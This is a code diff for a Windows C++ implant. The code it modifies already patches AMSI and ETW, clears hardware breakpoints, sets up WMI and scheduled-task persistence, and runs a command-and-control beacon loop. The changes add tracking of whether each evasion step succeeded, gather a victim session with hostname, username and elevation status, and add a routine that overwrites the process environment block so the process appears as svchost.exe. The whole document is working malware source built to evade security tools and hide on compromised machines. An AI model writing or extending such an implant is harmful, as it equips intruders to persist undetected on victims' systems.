@@ -9,6 +9,7 @@
 #include "persistence.hpp"
 #include "injection.hpp"
 #include "obfuscate.hpp"
+#include <string>
 
 // ─── Debug log — pure Win32, no CRT, works from first instruction ─────────────
 #ifdef DEBUG
@@ -84,10 +85,11 @@ DWORD WINAPI ImplantThread(LPVOID) {
     }
     DBG("InitializeSyscalls ok");
 
-    try { PatchAMSI(); } catch(...) { DBG("PatchAMSI EXCEPTION"); }
-    try { PatchETW(); } catch(...) { DBG("PatchETW EXCEPTION"); }
-    try { ClearHardwareBreakpoints(); } catch(...) { DBG("ClearHWBP EXCEPTION"); }
-    DBG("evasion done");
+    BOOL amsiOk = FALSE, etwOk = FALSE, hwbpOk = FALSE;
+    try { amsiOk = PatchAMSI(); } catch(...) { DBG("PatchAMSI EXCEPTION"); }
+    try { etwOk  = PatchETW();  } catch(...) { DBG("PatchETW EXCEPTION"); }
+    try { hwbpOk = ClearHardwareBreakpoints(); } catch(...) { DBG("ClearHWBP EXCEPTION"); }
+    DBG("evasion done amsi=%d etw=%d hwbp=%d", (int)amsiOk, (int)etwOk, (int)hwbpOk);
 
     wchar_t exePath[MAX_PATH] = {};
     GetModuleFileNameW(NULL, exePath, MAX_PATH);
@@ -120,9 +122,21 @@ DWORD WINAPI ImplantThread(LPVOID) {
     }, ctx, 0, nullptr);
     DBG("persistence done (WMI/schtask async)");
 
+    // Build session here from already-completed evasion — never re-patch in BeaconLoop
+    Session session;
+    session.hostname     = GetHostname();
+    session.username     = GetUsername();
+    session.build        = GetOSBuild();
+    session.elevated     = IsElevated();
+    session.amsiPatched  = amsiOk;
+    session.etwPatched   = etwOk;
+    session.hwbpsCleared = hwbpOk;
+    session.sessionId    = GetHostnameHash() + L"|" + session.username;
+    DBG("session=%ls", session.sessionId.c_str());
+
     DBG("BeaconLoop start");
     try {
-        BeaconLoop();
+        BeaconLoop(session);
     } catch(...) {
         DBG("BeaconLoop EXCEPTION");
         return 1;
@@ -131,9 +145,64 @@ DWORD WINAPI ImplantThread(LPVOID) {
     return 0;
 }
 
+// ─── PEB image name spoof ─────────────────────────────────────────────────────
+// Overwrites PEB.ProcessParameters.ImagePathName and CommandLine with a
+// believable system path. Task Manager and most tools read from the PEB —
+// not from the filesystem — so this changes what shows in the process list.
+static void SpoofPEB() {
+    typedef struct _PEB_LDR_HACK {
+        BYTE Reserved1[16];
+        PVOID Reserved2[10];
+        UNICODE_STRING ImagePathName;
+        UNICODE_STRING CommandLine;
+    } RTL_USER_PROCESS_PARAMETERS_HACK;
+
+    typedef struct _PEB_HACK {
+        BYTE Reserved1[2];
+        BYTE BeingDebugged;
+        BYTE Reserved2[1];
+        PVOID Reserved3[2];
+        PVOID Ldr;
+        RTL_USER_PROCESS_PARAMETERS_HACK* ProcessParameters;
+    } PEB_HACK;
+
+#ifdef _WIN64
+    PEB_HACK* peb = reinterpret_cast<PEB_HACK*>(__readgsqword(0x60));
+#else
+    PEB_HACK* peb = reinterpret_cast<PEB_HACK*>(__readfsdword(0x30));
+#endif
+    if (!peb || !peb->ProcessParameters) return;
+
+    // Target spoof: svchost.exe running under a common service
+    static wchar_t fakePath[] =
+        L"C:\\Windows\\System32\\svchost.exe";
+    static wchar_t fakeCmd[] =
+        L"C:\\Windows\\System32\\svchost.exe -k netsvcs -p -s Schedule";
+
+    auto& ip  = peb->ProcessParameters->ImagePathName;
+    auto& cmd = peb->ProcessParameters->CommandLine;
+
+    DWORD old = 0;
+    VirtualProtect(ip.Buffer,  ip.MaximumLength,  PAGE_READWRITE, &old);
+    VirtualProtect(cmd.Buffer, cmd.MaximumLength, PAGE_READWRITE, &old);
+
+    // Write fake strings — lengths must not exceed original buffer
+    USHORT pathBytes = static_cast<USHORT>(wcslen(fakePath) * sizeof(wchar_t));
+    USHORT cmdBytes  = static_cast<USHORT>(wcslen(fakeCmd)  * sizeof(wchar_t));
+
+    if (pathBytes <= ip.MaximumLength) {
+        memcpy(ip.Buffer,  fakePath, pathBytes);
+        ip.Length = pathBytes;
+    }
+    if (cmdBytes <= cmd.MaximumLength) {
+        memcpy(cmd.Buffer, fakeCmd, cmdBytes);
+        cmd.Length = cmdBytes;
+    }
+}
+
 int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
-    // ponytail: manifest sets requireAdministrator — Windows handles UAC at launch,
-    // no ShellExecuteExW runas needed. Single process, always elevated here.
+    SpoofPEB();
+
     DBG("===== WinMain pid=%lu elevated=%d =====",
         GetCurrentProcessId(), (int)IsElevated());
 
